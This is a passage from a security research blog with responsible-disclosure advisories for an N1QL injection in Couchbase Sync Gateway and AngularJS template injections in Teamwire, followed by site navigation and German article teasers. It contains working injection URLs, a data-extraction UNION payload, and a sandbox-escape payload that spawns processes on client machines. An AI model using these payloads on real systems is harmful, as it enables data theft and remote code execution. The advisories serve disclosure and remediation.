/{db}/_all_docs?startkey=123%27%20AND%201%3d1%00&endkey=
```

Inserting a statement that always evaluates to false (“AND
1=0”) yields no results:

```
/{db}/_all_docs?startkey=123%27%20AND%201%3d0%00&endkey=
```

The following request can be used to extract
additional information from a default installation:

```
/{db}/_all_docs?startkey=123%27%20UNION%20ALL%20SELECT
%20TOSTRING(BASE64_DECODE("U1FMLUl
uamVjdGlvbg=="))%20as%20id%3b%00&endkey=
```

The inserted N1QL statement “UNION ALL SELECT
TOSTRING(BASE64\_DECODE(„U1FMLUluamVjdGlvbg==“)) as id” adds the
following line to the output and shows that N1QL functions and queries are
evaluated:

```
{"rows":[
{"key":"SQL-Injection","id":"SQL-Injection","value":{"rev":""}}
...
```

The same injection works for the parameter “endkey”.

Additional modification of the query seems to be
required to make UNION-injections work when channels and users are set up for
the database. Data extraction methods that rely on comparisons will work as shown.

**Impact:**

An attacker with access to the public REST API is able
to issue additional N1QL statements and extract sensitive data or call
arbitrary N1QL functions. By issuing nested queries with CPU-intensive
operations, he might be able to cause increased resource usage and denial of
service conditions.

**Remediation:**

Traditional remediations for SQL injection vulnerabilities
also apply to N1QL. Features like parameterized N1QL queries should be used to
prevent the injection of N1QL statements into the original query.

As the vulnerability exists in the default Couchbase
Sync Gateway, an update will fix the problem. HiSolutions has responsibly reported
the issue to the vendor. The fix is available in Sync Gateway v2.5 as well as
in v2.1.3.

Short-term remediation can be implemented by blocking
all requests containing “startkey” or “endkey” on the web-interface.

**[Responsible Disclosure](https://research.hisolutions.com/2023/02/wenn-der-white-hat-hacker-anruft-aber-niemand-rangeht/) Timeline**

15.02.2019 – HiSolution initially notifies security@couchbase.com with vulnerability details and the internal
responsible disclosure guideline.

20.02.2019 – Couchbase acknowledges the vulnerability
and states that an engineering team is working on the issue. Couchbase offers
to help with the CVE request to [MITRE](https://research.hisolutions.com/2023/03/medientipp-maerz-2023/).

23.02.2019 – HiSolutions inquires whether the
engineering team was able to reproduce the issue and requests an ETA for a
patch. HiSolutions notifies Couchbase that a CVE number was requested.

23.02.2019 – MITRE assigns CVE-2019-9039 for the
vulnerability.

26.02.2019 – Couchbase sends an email to HiSolutions with
their assessment of the CVSS (<https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L>). Couchbase states in this email that a patch is under
development and that they will follow up with an ETA. Couchbase requests the
CVE number.

26.02.2019 – HiSolutions sends the CVE number to
Couchbase and questions the assessed CVSS. User interaction should be “none”
from HiSolutions perspective (CVSS v3 Vector: [AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L)).

26.02.2019 – Couchbase explains their assessment of
the CVSS and states that they will follow up an ETA for the patch.

25.03.2019 – HiSolutions inquires  if an ETA is available and explains the
assessment of the User Interaction CVSS vector.

12.04.2019 – HiSolutions inquires if the last email
was received successfully. HiSolutions reminds Couchbase that the issue is
scheduled for disclosure on 21.05.2019 and request to be notified if more time
is needed by Couchbase.

15.04.2019 – Couchbase apologizes for the delayed
response. The patch for the Sync Gateway is expected at the end of April. Couchbase
agrees to a public disclosure on 21.05.2019. Couchbase informs HiSolutions that
they will list the issue on a changed website under <https://www.couchbase.com/resources/security> within a table containing all vulnerabilities, fix release dates, versions,
and affected products.

14.05.2019 – HiSolutions notices that the patch is
applied in the latest public version. HiSolutions sends an inquiry regarding
the vulnerability table on the website and if 21.05.2019 is still good for the
disclosure.

21.05.2019 – HiSolutions postpones the disclosure
because no answer was received.

11.06.2019 – HiSolutions inquires regarding the table
on the website and a new disclosure date. A delivery failure for the contact
address of the initial contact within the security team is received. The email is
resent to the security team with the request for an answer by another team
member.

12.06.2019 – Couchbase replies that the fix is
included in Sync Gateway v2.5 as well as in v2.1.3. The release notes for both
products will be updated in the following days to include a reference to the
vulnerability. Couchbase is actively working on the vulnerability table. While
unclear if the table will be finished until 21.06.2019, HiSolutions can
disclose the issue on 21.06.2019 if Couchbase has updated the release release
notes until then.

**Further references**

<https://docs.couchbase.com/dotnet-sdk/2.2/prepared-statements.html> <https://docs.couchbase.com/java-sdk/2.7/n1ql-query.html#devguide-named-placeholders>

[![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2019/06/Teamwire_Messenger.jpg)](https://research.hisolutions.com/2019/06/web-vulnerabilities-are-coming-to-the-desktop-template-injections-lead-to-rce-in-teamwire/ "Web vulnerabilities are coming to the Desktop – Template Injections lead to RCE in Teamwire")

[21. Juni 201928. Juni 2019](https://research.hisolutions.com/2019/06/web-vulnerabilities-are-coming-to-the-desktop-template-injections-lead-to-rce-in-teamwire/)[Advisories](https://research.hisolutions.com/category/advisories/)
## [Web vulnerabilities are coming to the Desktop – Template Injections lead to RCE in Teamwire](https://research.hisolutions.com/2019/06/web-vulnerabilities-are-coming-to-the-desktop-template-injections-lead-to-rce-in-teamwire/)

**TL;DR (Teamwire users):** A vulnerability has been found in Teamwire which can allow malicious users to execute commands on victim’s computers by sending a crafted Teamwire message. Upgrade Teamwire to the newest version as soon as possible to fix this vulnerability.

**TL;DR (Technical):** Template injections are a common vulnerability in web applications. If a desktop application built on a web engine is vulnerable to template injection, this can result in remote code execution on the client system.

### **Background**

Template injection refers
to a class of vulnerabilities that [exploit](https://research.hisolutions.com/2023/03/wir-nehmen-rtf-da-gibt-es-keine-makros-dafuer-aber-einen-exploit/) the insecure embedding of user
controllable data into template engines like AngularJS. Template engines use
template files to define the design of a user interface by inserting special
placeholders into a text. The template engine then dynamically replaces the placeholders
with data at runtime, referred to as “rendering” the template. Many modern
template engines even support carrying out complex computations inside the
templates themselves. If an attacker embed one of these placeholders into a
template, he can often execute functions in the underlying programming
language.

To help support cross-platform compatibility,
software vendors started embedding web engines into client desktop
applications, thus removing the need to develop native applications for all
different client platforms. NW.js is a technology that combines the browser
engine WebKit with the JavaScript framework Node.js, and is often used to create
cross-platform applications. This combination enables users to call Node.js
functions directly from the DOM of the embedded Chromium browser.

For web applications, template injections are well known problem. Due to the increasing use of web technologies for the rapid development of client applications, this class of vulnerabilities has begun to manifest itself on the desktop too.

[Teamwire](https://www.teamwire.eu/) is a “fast, intuitive and secure enterprise messaging app” for businesses. Teamwire clients are available for iPhone, iPad, Android, Windows Phone, Windows PC, Mac OS and Linux.

HiSolutions researchers have found
two distinct template injection vulnerabilities during an internal security
assessment of the Teamwire messaging platform (clients on Windows and the administrative
interface), which could be used to target end users or platform administrators.

### **Technical Background**

Teamwire is built on AngularJS. Angular implements a secure sandbox to attempt to prevent attacks even if user input is insecurely embedded in templates. As the sandbox was [repeatedly bypassed](https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs), AngularJS developers decided that the effort was futile and shifted the responsibility back to  application developers. Currently, bypasses exist for all AngularJS Versions that enable an attacker to escape from the sandbox and execute arbitrary JavaScript commands.

Template injections in AngularJS can be illustrated as follows: If an attacker succeeds in inserting placeholder string, delineated with double curly brackets ( “**{{…}}**” ) into a template inside the application, any operations inside the brackets will be carried out when the template is rendered. In this case, inserting **{{77\*77}}** into the name field (left) results in the product (**5929**) being displayed in the rendered display (right).

![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2019/06/1-example-calculation.png)

The expression „77\*77“ evaluates to „5929“ when the template is rendered.

To bypass the sandbox in
AngularJS 1.6.8, which is used by Teamwire, the following template string can
be used:

***{{constructor.constructor(‚###JavaScript-Code-Here###‘)()}}***

### **Vulnerability Details**

#### Stored XXS in Admin Web Interface – CVE-2018-17560

Users can change their
displayed usernames in the Teamwire clients without any restrictions. A user could
therefore change his username to include a template string:

***his {{constructor.constructor(‚document.body.style.backgroundColor = „green“;‘)()}}***

Our researchers found
that when an administrator views the user inside the administrative web panel,
the username is embedded insecurely (i.e. without encoding the placeholder to
prevent execution) into the web page and the JavaScript code in the string is
executed.

The example payload above
only changes the background color of the HTML page, but a malicious user could
insert arbitrary JavaScript code to be executed in the browser. An attacker
could for example try to take over an administrator’s session or try to execute
actions with admin rights in the web portal.

Attempting to delete the
“malicious” user also triggers the vulnerability, as the admin must first view
the user in the web interface to be able to delete them.

#### Desktop Client RCE – CVE-2018-17170

Another template
injection was found inside the Teamwire desktop client. The vulnerable field
was the name of a group chat. A malicious user must first create a chat with a
crafted name including the template string. They can exploit this vulnerability
to execute code on the victim’s system. If another user included in the chat
writes a message to the attacker by selecting him from his contact list, the
client merges the chats and the payload is executed on the victim’s system. Because
the victim selects the other user from the contact list, he cannot see the
manipulated chat name before the JavaScript is executed.

That only the first
character of the chat names is displayed in the overview further helps to
hide  malicious payloads.

![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2019/06/2-chatname-1024x328.png)

Only the first part of the chat name is shown (left), hiding the malicious part.

---

The same code execution vulnerability is
exploitable when the victim starts a chat with another user with a specially
crafted username.

Because the Teamwire
desktop client uses NW.js and the embedded Node.js has the ability to spawn
arbitrary processes, template injection actually results in remote code
execution on the client system.

This example payload opens
the windows calculator on the client system:

***{{constructor.constructor(„const x=require(‚child\_process‘).spawn; x(‚calc.exe‘);“)()}}***

![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2019/06/3-calc-spawned.png)

The template injection can even lead to code execution on the receiving client.

Due to the internal
structure of the code, the payload is executed four times when the
vulnerability is triggered by sending a message.

### **Impact and Mitigations**

The impact of the
vulnerabilities is limited by the fact that a valid user account attributed to
the organization is needed to perform the attack. If an attacker has obtained
access to an account, no mitigation against the attack in the web interface
(apart from not using it) exist. Preventing the code execution attack against
the clients requires not accepting any messages from other accounts, obviating
the purpose of a messaging application.

The vulnerabilities described above have been fixed in the backend version *prod-2018-11-13-15-00-42*and in the desktop client version 1.9.0 released on 16.11.2018. To fully mitigate the vulnerabilities and continue the use of the product, these updates should be installed as soon as possible.

The vulnerability CVE-2018-17170 has been verified for the desktop client version *1.5.1*, it affects most likely all versions prio to 1.9.0. The vulnerability CVE-2018-17560 affects all backend version prior to *prod-2018-11-13-15-00-42*.

### **Disclosure Timeline**

16. October 2018 – Initial
contact with the vendor

16. October 2018 – Submission
of vulnerability details to the vendor

22. October 2018 – Further
communication with vendor

16. November 2018 – Update released

21.  June 2019 – Public disclosure (the vendor asked for a postponed publication of the details, which we agreed on)

### Credits

The vulnerabiliy was found by Julian Beier, Lars Burhop, Benjamin Braun, Viktor Schlüter and Denis Werner (HiSolutions).

* [Elektronische Patientenakte (ePA): nicht so sicher](https://research.hisolutions.com/2025/01/elektronische-patientenakte-epa-nicht-so-sicher/)16. Januar 2025
* [NSO vs. Whatsapp](https://research.hisolutions.com/2025/01/nso-vs-whatsapp/)16. Januar 2025
* [Windows-BitLocker-Probleme](https://research.hisolutions.com/2025/01/windows-bitlocker-probleme/)16. Januar 2025
* [Wahlsoftware 2.0](https://research.hisolutions.com/2025/01/wahlsoftware-2-0/)16. Januar 2025
* [Kritische Abhängigkeiten in unserem (digitalen) Alltag](https://research.hisolutions.com/2024/12/kritische-abhaengigkeiten-in-unserem-digitalen-alltag/)12. Dezember 2024
* [iOS 18: Sicherheitsfeatures und Mythen über Mobilgeräte](https://research.hisolutions.com/2024/12/ios-18-sicherheitsfeatures-und-mythen-ueber-mobilgeraete/)12. Dezember 2024
* [Technische Geräte und Remote-Zugriffe durch Hersteller](https://research.hisolutions.com/2024/12/technische-geraete-und-remote-zugriffe-durch-hersteller/)12. Dezember 2024
* [DDoS-Attacke auf das Internet Archive: Ein Schlag gegen die digitale Bewahrung](https://research.hisolutions.com/2024/11/ddos-attacke-auf-das-internet-archive-ein-schlag-gegen-die-digitale-bewahrung/)14. November 2024
* [Das Passwort in der Excel-Tabelle](https://research.hisolutions.com/2024/11/das-passwort-in-der-excel-tabelle/)14. November 2024
* [Hackerparagraph: Neue Version, alte Probleme](https://research.hisolutions.com/2024/11/hackerparagraph-neue-version-alte-probleme/)14. November 2024
* [Seitenkanal des Monats: Wenn die Handy-Rückseite vibriert](https://research.hisolutions.com/2024/11/seitenkanal-des-monats-wenn-die-handy-rueckseite-vibriert/)14. November 2024
* [Sieht der Fernseher mit?](https://research.hisolutions.com/2024/10/sieht-der-fernseher-mit/)17. Oktober 2024

[Angriff](https://research.hisolutions.com/tag/angriff/)
[Black hat](https://research.hisolutions.com/tag/black-hat/)
[Browser](https://research.hisolutions.com/tag/browser/)
[BSI](https://research.hisolutions.com/tag/bsi/)
[Cloud](https://research.hisolutions.com/tag/cloud/)
[Corona](https://research.hisolutions.com/tag/corona/)
[CVE](https://research.hisolutions.com/tag/cve/)
[Cyberangriff](https://research.hisolutions.com/tag/cyberangriff/)
[Cyberattacken](https://research.hisolutions.com/tag/cyberattacken/)
[Cybersecurity](https://research.hisolutions.com/tag/cybersecurity/)
[Datenschutz](https://research.hisolutions.com/tag/datenschutz/)
[Emotet](https://research.hisolutions.com/tag/emotet/)
[Exchange](https://research.hisolutions.com/tag/exchange/)
[Hacker](https://research.hisolutions.com/tag/hacker/)
[Hackerangriff](https://research.hisolutions.com/tag/hackerangriff/)
[HAFNIUM](https://research.hisolutions.com/tag/hafnium/)
[Incident Response](https://research.hisolutions.com/tag/incident-response/)
[KI](https://research.hisolutions.com/tag/ki/)
[KRITIS](https://research.hisolutions.com/tag/kritis/)
[Künstliche Intelligenz](https://research.hisolutions.com/tag/kuenstliche-intelligenz/)
[Linux](https://research.hisolutions.com/tag/linux/)
[Malware](https://research.hisolutions.com/tag/malware/)
[Microsoft](https://research.hisolutions.com/tag/microsoft/)
[Pandemie](https://research.hisolutions.com/tag/pandemie/)
[Passwort](https://research.hisolutions.com/tag/passwort/)
[Penetrationstest](https://research.hisolutions.com/tag/penetrationstest/)
[Phishing](https://research.hisolutions.com/tag/phishing/)
[ProxyLogon](https://research.hisolutions.com/tag/proxylogon/)
[Quantencomputer](https://research.hisolutions.com/tag/quantencomputer/)
[Ransomware](https://research.hisolutions.com/tag/ransomware/)
[Safety](https://research.hisolutions.com/tag/safety/)
[Schadsoftware](https://research.hisolutions.com/tag/schadsoftware/)
[Schwachstelle](https://research.hisolutions.com/tag/schwachstelle/)
[Security](https://research.hisolutions.com/tag/security/)
[Server](https://research.hisolutions.com/tag/server/)
[Shitrix](https://research.hisolutions.com/tag/shitrix/)
[Sicherheitslücken](https://research.hisolutions.com/tag/sicherheitsluecken/)
[Supply Chain Security](https://research.hisolutions.com/tag/supply-chain-security/)
[Trojaner](https://research.hisolutions.com/tag/trojaner/)
[Verschlüsselung](https://research.hisolutions.com/tag/verschluesselung/)
[Vulnerability](https://research.hisolutions.com/tag/vulnerability/)
[Zeroday](https://research.hisolutions.com/tag/zeroday/)

* [Advisories](https://research.hisolutions.com/category/advisories/) (25)
* [Allgemein](https://research.hisolutions.com/category/allgemein/) (72)
* [Digital Workplace](https://research.hisolutions.com/category/digital-workplace/) (1)
* [Forensics](https://research.hisolutions.com/category/forensics/) (1)
* [ITSM](https://research.hisolutions.com/category/itsm/) (1)
* [News](https://research.hisolutions.com/category/news/) (393)
* [Publikationen](https://research.hisolutions.com/category/publikationen/) (4)
  + [Kolumne](https://research.hisolutions.com/category/publikationen/kolumne/) (2)
* [Themen](https://research.hisolutions.com/category/themen/) (115)
  + [Blockchain](https://research.hisolutions.com/category/themen/blockchain/) (2)
  + [Cloud](https://research.hisolutions.com/category/themen/cloud/) (9)
  + [Corona](https://research.hisolutions.com/category/themen/corona/) (4)
  + [Cyberwar](https://research.hisolutions.com/category/themen/cyberwar/) (7)
  + [ICS](https://research.hisolutions.com/category/themen/ics/) (1)
  + [Incidents](https://research.hisolutions.com/category/themen/incidents/) (18)
    - [Hafnium](https://research.hisolutions.com/category/themen/incidents/hafnium/) (10)
    - [Log4Shell](https://research.hisolutions.com/category/themen/incidents/log4shell/) (3)
  + [ISMS](https://research.hisolutions.com/category/themen/isms/) (1)
  + [KI/ML](https://research.hisolutions.com/category/themen/ki-ml/) (6)
  + [KMU](https://research.hisolutions.com/category/themen/kmu/) (1)
  + [Kritis](https://research.hisolutions.com/category/themen/kritis/) (6)
  + [Kryptographie](https://research.hisolutions.com/category/themen/kryptographie/) (7)
  + [Malware](https://research.hisolutions.com/category/themen/malware/) (5)
  + [Netzwerk](https://research.hisolutions.com/category/themen/netzwerk/) (7)
  + [OSINT](https://research.hisolutions.com/category/themen/osint/) (1)
  + [Passwörter](https://research.hisolutions.com/category/themen/passwoerter/) (4)
  + [Penetrationstest](https://research.hisolutions.com/category/themen/penetrationstest/) (7)
  + [Phishing](https://research.hisolutions.com/category/themen/phishing/) (3)
  + [Ransomware](https://research.hisolutions.com/category/themen/ransomware/) (8)
  + [Red Teaming](https://research.hisolutions.com/category/themen/red-teaming/) (1)
  + [Risikomanagement](https://research.hisolutions.com/category/themen/risikomanagement/) (6)
  + [SASE](https://research.hisolutions.com/category/themen/sase/) (1)
  + [Schwachstelle](https://research.hisolutions.com/category/themen/schwachstelle/) (26)
  + [Security Engineering](https://research.hisolutions.com/category/themen/security-engineering/) (7)
  + [Supply Chain](https://research.hisolutions.com/category/themen/supply-chain/) (3)
  + [Weiterbildung](https://research.hisolutions.com/category/themen/weiterbildung/) (2)
  + [Zeroday](https://research.hisolutions.com/category/themen/zeroday/) (6)
* [Threat Intelligence](https://research.hisolutions.com/category/threat-intelligence/) (1)
* [Veranstaltungen](https://research.hisolutions.com/category/veranstaltungen/) (3)
### Hier schreiben

* ![Abraham Söyler](data:image/gif;base64...)![Abraham Söyler](https://research.hisolutions.com/wp-content/uploads/2024/10/Abraham-Soeyler_Business-200x200.jpg)

  [Abraham Söyler](https://research.hisolutions.com/author/soeyler/ "Abraham Söyler")
* ![Cass Rebbelin](data:image/gif;base64...)![Cass Rebbelin](https://research.hisolutions.com/wp-content/uploads/2023/12/Cass-Rebbelin_Business-150x150.jpg)

  [Cass Rebbelin](https://research.hisolutions.com/author/rebbelin/ "Cass Rebbelin")
* ![Constantin Kirsch - HiSolutions AG](data:image/gif;base64...)![Constantin Kirsch - HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/05/Constantin-Kirsch_200x200_intern.jpg)

  [Constantin Kirsch](https://research.hisolutions.com/author/constantink/ "Constantin Kirsch")
* ![Daniel Jedecke - HiSolutions](data:image/gif;base64...)![Daniel Jedecke - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Daniel-Jedecke_200x200_intern.jpg)

  [Daniel Jedecke](https://research.hisolutions.com/author/jedi/ "Daniel Jedecke")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/07/David-Mathiszik_200x200_intern.png)

  [David Mathiszik](https://research.hisolutions.com/author/davidm/ "David Mathiszik")
* ![Denis Werner - HiSolutions](data:image/gif;base64...)![Denis Werner - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Denis-Werner_200x200_intern.png)

  [Denis Werner](https://research.hisolutions.com/author/denisw/ "Denis Werner")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Joerg-Schneider-1.jpg)

  [Dr. Jörg Schneider](https://research.hisolutions.com/author/schneider/ "Dr. Jörg Schneider")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Folker-Schmidt-1-1.jpg)

  [Folker Schmidt](https://research.hisolutions.com/author/folkers/ "Folker Schmidt")
* ![Franz Gläser](data:image/gif;base64...)![Franz Gläser](https://research.hisolutions.com/wp-content/uploads/2025/01/Franz-Gläser_200x200_intern.jpg)

  [Franz Gläser](https://research.hisolutions.com/author/glaeser/ "Franz Gläser")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2022/11/Heike_Knobbe_Blog.jpg)

  [Heike Knobbe](https://research.hisolutions.com/author/knobbe/ "Heike Knobbe")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/10/Holger-von-Rhein_200x200_intern.png)

  [Holger von Rhein](https://research.hisolutions.com/author/holger/ "Holger von Rhein")
* ![Justus Tartz](data:image/gif;base64...)![Justus Tartz](https://research.hisolutions.com/wp-content/uploads/2024/01/Justus-Tartz_Business-Zuschnitt-150x150.jpg)

  [Justus Tartz](https://research.hisolutions.com/author/justust/ "Justus Tartz")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Lars-Burhop_200x200_intern.jpg)

  [Lars Burhop](https://research.hisolutions.com/author/larsb/ "Lars Burhop")
* ![Lisa Lobmeyer - HiSolutions](data:image/gif;base64...)![Lisa Lobmeyer - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Lisa-Lobmeyer_intern_200x200.jpg)

  [Lisa Lobmeyer](https://research.hisolutions.com/author/lisal/ "Lisa Lobmeyer")
* ![Martin Glaser](data:image/gif;base64...)![Martin Glaser](https://research.hisolutions.com/wp-content/uploads/2023/12/Martin-Glaser_Business-150x150.jpg)

  [Martin Glaser](https://research.hisolutions.com/author/glaser/ "Martin Glaser")
* ![Michael Sehring - HiSolutions](data:image/gif;base64...)![Michael Sehring - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Michael-Sehring_200x200_intern.jpg)

  [Michael Sehring](https://research.hisolutions.com/author/michaels/ "Michael Sehring")
* ![Nicolas Sprenger, HiSolutions AG](data:image/gif;base64...)![Nicolas Sprenger, HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/06/Nicolas-Sprenger_intern_200x200.jpg)

  [Nicolas Sprenger](https://research.hisolutions.com/author/nicolas-sprenger/ "Nicolas Sprenger")
* ![Oliver Saynisch](data:image/gif;base64...)![Oliver Saynisch](https://research.hisolutions.com/wp-content/uploads/2023/07/Oliver-Saynisch_Business-150x150.jpg)

  [Oliver Saynisch](https://research.hisolutions.com/author/saynisch/ "Oliver Saynisch")
* ![Pascal Boxen](data:image/gif;base64...)![Pascal Boxen](https://research.hisolutions.com/wp-content/uploads/2023/07/Pascal-Boxen_Business-150x150.jpg)

  [Pascal Boxen](https://research.hisolutions.com/author/boxen/ "Pascal Boxen")
* ![Ronny Dobra - HiSolutions AG](data:image/gif;base64...)![Ronny Dobra - HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/05/Ronny-Dobra_200x200_intern.jpg)

  [Ronny Dobra](https://research.hisolutions.com/author/ronnyd/ "Ronny Dobra")
* ![Torge Ewald](data:image/gif;base64...)![Torge Ewald](https://research.hisolutions.com/wp-content/uploads/2023/07/Torge-Ewald_Original_Business-150x150.jpg)

  [Torge Ewald](https://research.hisolutions.com/author/ewald/ "Torge Ewald")

* [Twitter: @hisolutions](https://twitter.com/hisolutions)
* [LinkedIn](https://de.linkedin.com/company/hisolutions-ag)
* [Xing](https://www.xing.com/companies/hisolutionsag)
* research@hisolutions.com
* [Mastodon](https://infosec.exchange/%40hisolutions)

* [Kontakt](https://research.hisolutions.com/kontakt/)
* [HiSolutions AG](https://www.hisolutions.com)
* [Impressum](https://www.hisolutions.com/impressum/)
* [Datenschutzhinweise](https://www.hisolutions.com/datenschutz)

© 2025 HiSolutions Research. Stolz präsentiert von [Sydney](https://athemes.com/theme/sydney/)



=== Content from research.hisolutions.com_6c21b947_20250121_012420.html ===


[Zum Inhalt springen](#content)

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")
# HiSolutions Research

* [News](https://research.hisolutions.com/category/news/)
* [Advisories](https://research.hisolutions.com/category/advisories/)
* [Forschungsprojekte](https://research.hisolutions.com/forschungsprojekte/)
  + [AQUA-IT-Lab](https://research.hisolutions.com/forschungsprojekte/aqua-it-lab/)
  + [ITS.OVERVIEW](https://research.hisolutions.com/forschungsprojekte/its-overview/)
  + [ReKom-S](https://research.hisolutions.com/forschungsprojekte/rekom-s/)
* [Über uns](https://research.hisolutions.com/hisolutions-research/)
  + [Wer schreibt hier?](https://research.hisolutions.com/hier-schreiben/)
  + [Kontakt](https://research.hisolutions.com/kontakt/)
  + [HiSolutions AG](https://www.hisolutions.com)
  + [HiSolutions SAM-Blog](https://sam.news)

Suche

Suche nach:

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

*Menü schließen*

* [News](https://research.hisolutions.com/category/news/)
* [Advisories](https://research.hisolutions.com/category/advisories/)
* [Forschungsprojekte](https://research.hisolutions.com/forschungsprojekte/)
  + [AQUA-IT-Lab](https://research.hisolutions.com/forschungsprojekte/aqua-it-lab/)
  + [ITS.OVERVIEW](https://research.hisolutions.com/forschungsprojekte/its-overview/)
  + [ReKom-S](https://research.hisolutions.com/forschungsprojekte/rekom-s/)
* [Über uns](https://research.hisolutions.com/hisolutions-research/)
  + [Wer schreibt hier?](https://research.hisolutions.com/hier-schreiben/)
  + [Kontakt](https://research.hisolutions.com/kontakt/)
  + [HiSolutions AG](https://www.hisolutions.com)
  + [HiSolutions SAM-Blog](https://sam.news)

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

Suche
Menü umschalten

Suche nach:

[![](https://research.hisolutions.com/wp-content/uploads/2025/01/2025-01_Digest_IT-Sicherheit_Blog.png)](https://research.hisolutions.com/2025/01/freigiebiger-datenreichtum-bei-vw/ "Freigiebiger Datenreichtum bei VW")

[16. Januar 2025](https://research.hisolutions.com/2025/01/freigiebiger-datenreichtum-bei-vw/)[Schwachstelle](https://research.hisolutions.com/category/themen/schwachstelle/)
## [Freigiebiger Datenreichtum bei VW](https://research.hisolutions.com/2025/01/freigiebiger-datenreichtum-bei-vw/)

Die Frage der Datenhoheit, die sich aus der Erfassung und Nutzung von Daten durch Fahrzeuge ergibt, ist Gegenstand kontroverser Diskussionen. Fahrzeughersteller vertreten die Auffassung, dass diese Daten als ihr Eigentum zu betrachten sind, während Halter von Fahrzeugen der Meinung sind, dass es sich um personenbezogene Daten handelt, was die Anwendung der DSGVO impliziert. https://www.adac.de/rund-ums-fahrzeug/ausstattung-technik-zubehoer/assistenzsysteme/daten-im-auto-eu-data-act Der ADAC hat bereits 2016 festgestellt, dass sich aus Daten der Autosensoren und der Bewegungsdaten Rückschlüsse auf das Nutzungsprofil ziehen lassen. Im Januar 2024 wies der […]

[![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2024/07/HiSolutions-RB_allgemeines-Bild.png)](https://research.hisolutions.com/2025/01/wie-funktioniert-eigentlich-malware-auf-handys/ "Wie funktioniert eigentlich Malware auf Handys?")

[16. Januar 202516. Januar 2025](https://research.hisolutions.com/2025/01/wie-funktioniert-eigentlich-malware-auf-handys/)[Allgemein](https://research.hisolutions.com/category/allgemein/), [Forensics](https://research.hisolutions.com/category/forensics/)
## [Wie funktioniert eigentlich Malware auf Handys?](https://research.hisolutions.com/2025/01/wie-funktioniert-eigentlich-malware-auf-handys/)

Dass einige Staaten unliebsame Journalisten und Oppositionelle über Mobilgeräte überwachen, ist mittlerweile keine große Neuigkeit mehr. Oftmals wird die israelische Firma Cellebrite in dem Kontext genannt. Wie genau dieser Prozess abläuft, wird von Amnestys SecurityLab [1] am Beispiel NoviSpy beschrieben. Neben den technischen Details, die natürlich für die IT-Security Community spannend sind, ist insbesondere die Art der initialen Kompromittierung fundamental für die Entwicklung des eigenen Threat Models. Werden Mobilgeräte (oder überhaupt technische Geräte) durch einen Dritten in einen anderen Raum […]

[![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2024/12/2024-12_Digest_IT-Sicherheit_Blog.png)](https://research.hisolutions.com/2024/12/lageberichte-und-erkenntnisse-aus-dem-jahr-2024/ "Lageberichte und Erkenntnisse aus dem Jahr 2024")

[12. Dezember 2024](https://research.hisolutions.com/2024/12/lageberichte-und-erkenntnisse-aus-dem-jahr-2024/)[Allgemein](https://research.hisolutions.com/category/allgemein/)
## [Lageberichte und Erkenntnisse aus dem Jahr 2024](https://research.hisolutions.com/2024/12/lageberichte-und-erkenntnisse-aus-dem-jahr-2024/)

Wie jedes Jahr beglücken uns das BSI und ähnliche Organisationen mit ihren Lageberichten und Erkenntnissen. Welche Defekte in diesem Jahr besonders häufig in Software festgestellt wurden, kann man der Top 25 CWE (Common Weakness Enumeration) von MITRE entnehmen. Ein beunruhigender Trend ist die ungewöhnlich häufige Nutzung von 0-day-Schwachstellen durch Ransomware-Gruppen. So kommt nun zu der mittlerweile hoffentlich bekannten Empfehlung, Patches zeitnah einzuspielen, die Frage hinzu, wie man mit 0-days umgeht. Eine Lösung: Security by Design. Auch wenn es sich dabei […]

[![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2024/11/HiSolutions_Research-Blog_Kataster_11-2024.jpg)](https://research.hisolutions.com/2024/11/bsi-grundschutz-krypto-kataster-ein-baustein-fuer-die-aufrechterhaltung-einer-sicheren-it-infrastruktur/ "BSI-Grundschutz-Krypto-Kataster: Ein Baustein für die Aufrechterhaltung einer sicheren IT-Infrastruktur ")

[15. November 202418. November 2024](https://research.hisolutions.com/2024/11/bsi-grundschutz-krypto-kataster-ein-baustein-fuer-die-aufrechterhaltung-einer-sicheren-it-infrastruktur/)[Advisories](https://research.hisolutions.com/category/advisories/)
